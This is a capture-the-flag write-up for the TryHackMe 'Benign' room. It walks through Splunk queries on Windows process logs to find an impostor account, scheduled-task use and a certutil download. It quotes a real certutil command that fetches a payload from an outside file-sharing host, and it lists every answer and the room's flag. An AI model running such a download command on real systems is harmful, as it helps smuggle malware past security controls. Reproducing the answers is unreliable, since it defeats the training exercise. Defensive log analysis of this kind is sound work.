# [TryHackMe | Benign](https://tryhackme.com/room/benign) Challenge Room Solution Writeup

## [Task 2 | Scenario - Identify and Investigate an Infected Host](https://tryhackme.com/room/benign?taskNo=2)

One of the client’s IDS indicated a potentially suspicious process execution indicating one of the hosts from the HR department was compromised. Some tools related to network information gathering / scheduled tasks were executed which confirmed the suspicion. Due to limited resources, we could only pull the process execution logs with Event ID: 4688 and ingested them into Splunk with the index win_eventlogs for further investigation.

About the Network Information

The network is divided into three logical segments. It will help in the investigation.

IT Department

- James
- Moin
- Katrina

HR department

- Haroon
- Chris
- Diana

Marketing department

- Bell
- Amelia
- Deepak

### How many logs are ingested from the month of March, 2022?

Run the query `index=win_eventlogs` to find **13959** logs.

### Imposter Alert: There seems to be an imposter account observed in the logs, what is the name of that user?

Run the query 

```bash
index=win_eventlogs 
| stats count by UserName

Amel1a	1
Amelia	1071
Bell	1104
Chris.fort	1130
Daina	1106
James	1336
Katrina	1274
Moin	1357
SYSTEM	3325
deepak	1118
haroon	1137
```

There exists one user impersonating Amelia, instead named **Amel1a**.

### Which user from the HR department was observed to be running scheduled tasks?

Run the query `index=win_eventlogs (UserName=Chris.fort OR UserName=daina OR UserName=haroon) *schtasks.exe*` to find `UserName:` **Chris.fort**.

### Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host.

Run the query `index=win_eventlogs (UserName=Chris.fort OR UserName=daina OR UserName=haroon) *certutil.exe*` to find `UserName:` **haroon**. Alternatively perform a search for rare `CommandLine` events.

### To bypass the security controls, which system process (lolbin) was used to download a payload from the internet?

The above query also shows `CommandLine:` **certutil.exe** `-urlcache -f - https://controlc.com/e4d11035 benign.exe`.

### What was the date that this binary was executed by the infected host? format (YYYY-MM-DD)

The previous query also shows the date to be 3/4/22 10:38:28.000 AM, which is reformat to **2022-03-04**.

### Which third-party site was accessed to download the malicious payload?

Continuing to read the previous query shows `CommandLine:` `certutil.exe -urlcache -f - https://`**controlc.com**`/e4d11035 benign.exe`.

### What is the name of the file that was saved on the host machine from the C2 server during the post-exploitation phase?

Continuing to read the previous query shows `CommandLine:` `certutil.exe -urlcache -f - https://controlc.com/e4d11035` **benign.exe**.

### The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{..........}; what is that pattern?

Visiting the below [URL](https://controlc.com/e4d11035) reveals a hosted file named flag.txt with contents **THM{KJ&*H^B0}**.

### What is the URL that the infected host connected to?

Continuing to read the previous query shows `CommandLine:` `certutil.exe -urlcache -f - `**[https://controlc.com/e4d11035]()**` benign.exe`.